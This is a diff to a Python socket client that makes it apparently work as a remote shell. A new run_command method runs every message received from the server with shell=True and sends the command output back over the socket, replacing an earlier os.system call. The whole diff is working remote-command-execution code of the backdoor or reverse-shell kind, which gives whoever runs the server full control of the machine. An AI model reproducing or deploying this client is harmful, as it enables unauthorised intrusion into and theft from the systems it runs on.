@@ -1,4 +1,5 @@
 import socket
+import subprocess
 from os import system
 from time import sleep
 
@@ -36,7 +37,30 @@ class client:
         if msg.decode() == "TEST":
             return
 
-        system(msg.decode())
+        self.run_command(msg.decode())
+
+
+    def run_command(self, cmd):
+        try:
+            output = subprocess.check_output(cmd, shell=True)
+            output = ''.join(chr(i) for i in output)
+        except subprocess.CalledProcessError as error:
+            output = error
+        self.send(output)
+
+    def send(self, msg):
+        msg_len = str(len(msg)).encode()
+
+        msg_len += b' ' *(HEADER - len(msg_len))
+
+        try:
+            self.server.send(msg_len)
+
+            self.server.send(msg.encode())
+        except (ConnectionResetError, ConnectionAbortedError):
+            return 0
+
+        return 1
 
 
 
